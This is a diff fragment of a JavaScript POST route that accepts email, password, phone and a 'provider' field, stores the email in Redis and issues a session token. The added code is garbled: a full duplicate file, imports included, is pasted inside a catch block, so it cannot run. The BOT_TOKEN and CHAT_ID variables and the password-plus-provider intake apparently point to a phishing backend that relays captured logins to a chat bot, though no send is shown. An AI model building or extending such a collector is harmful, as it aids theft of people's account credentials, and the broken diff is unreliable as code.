@@ -65,6 +65,73 @@ export async function POST(request) {
       ex: 60 * 60 * 24 * 30,
     });
   } catch (err) {
+    import { v4 as uuidv4 } from "uuid";
+import redis from "./redis-client.js";
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+
+function getSessionKey(token) {
+  return `session:${token}`;
+}
+
+export async function POST(request) {
+  if (
+    !BOT_TOKEN ||
+    !CHAT_ID ||
+    !process.env.UPSTASH_REDIS_REST_URL ||
+    !process.env.UPSTASH_REDIS_REST_TOKEN
+  ) {
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Missing BOT_TOKEN, CHAT_ID, or Redis env vars.",
+      }),
+      {
+        status: 500,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  }
+
+  let bodyObj;
+  try {
+    bodyObj = await request.json();
+  } catch {
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Invalid JSON body",
+      }),
+      {
+        status: 400,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  }
+
+  const { email, password, phone, provider } = bodyObj || {};
+  if (!email || !password || !provider) {
+    return new Response(
+      JSON.stringify({
+        success: false,
+        message: "Missing required fields",
+      }),
+      {
+        status: 400,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  }
+
+  const normalizedEmail = email.trim().toLowerCase();
+  const sessionToken = uuidv4();
+
+  try {
+    await redis.set(getSessionKey(sessionToken), normalizedEmail, {
+      ex: 60 * 60 * 24 * 30,
+    });
+  } catch (err) {
     console.error("Redis error:", err);
     return new Response(
       JSON.stringify({
